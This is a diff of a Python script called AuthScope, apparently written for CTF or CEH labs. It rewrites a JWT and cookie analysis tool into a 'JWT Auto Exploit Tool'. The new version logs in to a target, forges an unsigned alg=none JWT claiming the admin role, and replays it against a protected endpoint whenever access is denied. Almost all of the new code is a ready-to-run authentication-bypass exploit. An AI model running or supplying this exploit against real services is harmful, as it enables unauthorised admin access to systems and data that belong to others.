@@ -1,245 +1,132 @@
 #!/usr/bin/env python3
 """
-AuthScope v2
-CTF / Lab tool to:
-- Auto-authenticate (login)
-- Grab JWT automatically
-- Analyze JWT (alg=none, claims)
-- Enumerate cookies + headers
-- Export nuclei inputs
+AuthScope v3
+CTF / CEH Lab Tool
 
-Usage example:
-python authscope.py \
-  --url http://api.local/admin/data \
-  --auth-login http://api.local/auth/login \
-  --username alice \
-  --password alice123 \
-  --unsigned
+Features:
+- Auto-authenticate
+- Detect JWT alg=none
+- Automatically forge admin JWT
+- Exploit admin endpoint
 """
 
 import argparse
 import requests
-import re
-import sys
-import csv
 import json
 import base64
 import time
-from urllib.parse import urlparse
+import sys
 
-JWT_RE = re.compile(r'([A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{0,})')
-
-# ------------------------
+# --------------------
 # Helpers
-# ------------------------
+# --------------------
 
-def b64decode_nopad(data: str):
-    data += '=' * (-len(data) % 4)
-    return base64.urlsafe_b64decode(data.encode())
+def b64url_encode(obj):
+    raw = json.dumps(obj, separators=(",", ":")).encode()
+    return base64.urlsafe_b64encode(raw).decode().rstrip("=")
 
-def pretty(obj):
-    try:
-        return json.dumps(obj, indent=2)
-    except:
-        return str(obj)
+def b64decode_nopad(data):
+    data += "=" * (-len(data) % 4)
+    return json.loads(base64.urlsafe_b64decode(data))
 
-def decode_jwt(token):
-    info = {}
-    parts = token.split('.')
-    info['parts'] = len(parts)
+# --------------------
+# JWT Logic
+# --------------------
 
-    try:
-        info['header'] = json.loads(b64decode_nopad(parts[0]))
-    except Exception as e:
-        info['header_error'] = str(e)
+def analyze_jwt(token):
+    parts = token.split(".")
+    header = b64decode_nopad(parts[0])
+    payload = b64decode_nopad(parts[1])
 
-    try:
-        if len(parts) > 1 and parts[1]:
-            info['payload'] = json.loads(b64decode_nopad(parts[1]))
-    except Exception as e:
-        info['payload_error'] = str(e)
-
-    return info
-
-def analyze_token(token):
-    decoded = decode_jwt(token)
     notes = []
+    if header.get("alg") == "none":
+        notes.append("alg=none (UNSIGNED JWT)")
 
-    hdr = decoded.get('header', {})
-    payload = decoded.get('payload', {})
+    if "iss" not in payload:
+        notes.append("Missing iss")
+    if "aud" not in payload:
+        notes.append("Missing aud")
 
-    alg = hdr.get('alg') if isinstance(hdr, dict) else None
-    if alg:
-        notes.append(f"alg: {alg}")
-        if str(alg).lower() == "none":
-            notes.append("WARNING: alg=none (unsigned JWT)")
-    else:
-        notes.append("No alg found in JWT header")
+    return header, payload, notes
 
-    if 'exp' in payload:
-        if payload['exp'] < int(time.time()):
-            notes.append("Token appears EXPIRED")
-
-    if 'iss' not in payload:
-        notes.append("Missing 'iss' claim")
-    if 'aud' not in payload:
-        notes.append("Missing 'aud' claim")
-    if 'kid' not in hdr:
-        notes.append("Missing 'kid' header")
-
-    return decoded, notes
-
-def find_jwts(text):
-    return list(set(JWT_RE.findall(text or "")))
-
-def analyze_cookies(resp):
-    results = []
-    for c in resp.cookies:
-        results.append({
-            "name": c.name,
-            "httponly": "HttpOnly" in c._rest,
-            "secure": c.secure,
-            "samesite": c._rest.get("SameSite")
-        })
-    return results
-
-# ------------------------
-# Auto Auth
-# ------------------------
-
-def perform_login(url, username, password, unsigned, headers, timeout):
+def forge_admin_jwt():
+    header = {"alg": "none", "typ": "JWT"}
     payload = {
-        "username": username,
-        "password": password
+        "sub": 3,
+        "username": "admin",
+        "role": "admin",
+        "iat": int(time.time())
     }
+    return f"{b64url_encode(header)}.{b64url_encode(payload)}."
+
+# --------------------
+# Auth
+# --------------------
+
+def login(url, user, pw, unsigned):
+    data = {"username": user, "password": pw}
     if unsigned:
-        payload["unsigned"] = True
+        data["unsigned"] = True
 
-    r = requests.post(url, json=payload, headers=headers, timeout=timeout)
+    r = requests.post(url, json=data)
     if r.status_code != 200:
-        print(f"[!] Login failed ({r.status_code})")
-        return None
+        print("[!] Login failed")
+        sys.exit(1)
 
-    token = r.json().get("token")
-    if not token:
-        print("[!] No token in login response")
-        return None
+    return r.json()["token"]
 
-    print("[+] Login successful, JWT acquired")
-    return token
-
-# ------------------------
+# --------------------
 # Main
-# ------------------------
+# --------------------
 
 def main():
-    parser = argparse.ArgumentParser(description="AuthScope v2 — JWT & Auth Analysis Tool")
-
-    parser.add_argument("--url", "-u", required=True, help="Target URL")
-    parser.add_argument("--user-agent", default="AuthScope/2.0")
-    parser.add_argument("--timeout", type=int, default=15)
-
-    # Auth options
-    parser.add_argument("--auth-login", help="Login endpoint URL")
-    parser.add_argument("--username", help="Auth username")
-    parser.add_argument("--password", help="Auth password")
-    parser.add_argument("--unsigned", action="store_true", help="Request unsigned JWT (alg=none)")
-
-    # Export
-    parser.add_argument("--export", "-e", help="Export nuclei CSV")
+    parser = argparse.ArgumentParser(description="AuthScope v3 — JWT Auto Exploit Tool")
+    parser.add_argument("--url", required=True, help="Target URL")
+    parser.add_argument("--auth-login", required=True, help="Login endpoint")
+    parser.add_argument("--username", required=True)
+    parser.add_argument("--password", required=True)
+    parser.add_argument("--unsigned", action="store_true", help="Request alg=none JWT")
+    parser.add_argument("--auto-exploit", action="store_true", help="Auto forge admin JWT")
 
     args = parser.parse_args()
 
-    headers = {"User-Agent": args.user_agent}
-    token = None
+    print("[*] Logging in...")
+    token = login(args.auth_login, args.username, args.password, args.unsigned)
 
-    # ---- Auto Auth ----
-    if args.auth_login:
-        if not args.username or not args.password:
-            print("[!] Auth requires --username and --password")
-            sys.exit(1)
+    header, payload, notes = analyze_jwt(token)
 
-        token = perform_login(
-            args.auth_login,
-            args.username,
-            args.password,
-            args.unsigned,
-            headers,
-            args.timeout
-        )
+    print("\n[+] JWT obtained")
+    print("Header:", header)
+    print("Payload:", payload)
+    print("Notes:")
+    for n in notes:
+        print(" -", n)
 
-        if token:
-            headers["Authorization"] = f"Bearer {token}"
-            decoded, notes = analyze_token(token)
+    headers = {"Authorization": f"Bearer {token}"}
+    r = requests.get(args.url, headers=headers)
 
-            print("\n[+] JWT Analysis (login token)")
-            print("Header:")
-            print(pretty(decoded.get("header", {})))
-            print("Payload:")
-            print(pretty(decoded.get("payload", {})))
-            print("Notes:")
-            for n in notes:
-                print(" -", n)
-            print("\n" + "-"*40)
+    print(f"\n[*] Initial request → HTTP {r.status_code}")
 
-    # ---- Main Request ----
-    resp = requests.get(args.url, headers=headers, timeout=args.timeout, allow_redirects=True)
+    if r.status_code == 403 and args.auto_exploit:
+        print("\n[!] Access denied — attempting JWT NONE exploit")
 
-    print(f"\n[*] {args.url} → HTTP {resp.status_code}\n")
+        forged = forge_admin_jwt()
+        headers["Authorization"] = f"Bearer {forged}"
 
-    # Cookies
-    cookies = analyze_cookies(resp)
-    if cookies:
-        print("[+] Cookies:")
-        for c in cookies:
-            flags = []
-            if c["httponly"]: flags.append("HttpOnly")
-            if c["secure"]: flags.append("Secure")
-            if c["samesite"]: flags.append(f"SameSite={c['samesite']}")
-            print(f"  {c['name']} → {', '.join(flags) if flags else 'NO FLAGS'}")
+        r2 = requests.get(args.url, headers=headers)
+
+        print("[+] Forged admin JWT used")
+        print(f"[+] Exploit result → HTTP {r2.status_code}")
+
+        print("\nResponse:")
+        print(r2.text)
+
+    elif r.status_code == 200:
+        print("\n[+] Access granted")
+        print(r.text)
+
     else:
-        print("[*] No cookies detected")
-
-    # JWT discovery
-    found = []
-
-    for c in resp.cookies:
-        found.extend(find_jwts(c.value))
-
-    for k, v in resp.headers.items():
-        found.extend(find_jwts(v))
-
-    found.extend(find_jwts(resp.text))
-
-    found = list(set(found))
-
-    if found:
-        print(f"\n[+] Found {len(found)} JWT-like tokens\n")
-        for tok in found:
-            decoded, notes = analyze_token(tok)
-            print("Token:", tok)
-            print("Header:", pretty(decoded.get("header", {})))
-            print("Payload:", pretty(decoded.get("payload", {})))
-            print("Notes:")
-            for n in notes:
-                print(" -", n)
-            print("\n" + "-"*40)
-    else:
-        print("\n[*] No JWTs discovered")
-
-    # Export
-    if args.export:
-        parsed = urlparse(args.url)
-        with open(args.export, "w", newline="", encoding="utf-8") as f:
-            writer = csv.DictWriter(f, fieldnames=["url", "host", "auth_header", "sample_token"])
-            writer.writeheader()
-            writer.writerow({
-                "url": args.url,
-                "host": f"{parsed.scheme}://{parsed.netloc}",
-                "auth_header": "Authorization: Bearer {{TOKEN}}",
-                "sample_token": token or ""
-            })
-        print(f"[+] Exported nuclei CSV → {args.export}")
+        print("\n[-] Exploit not applicable")
 
 if __name__ == "__main__":
     main()
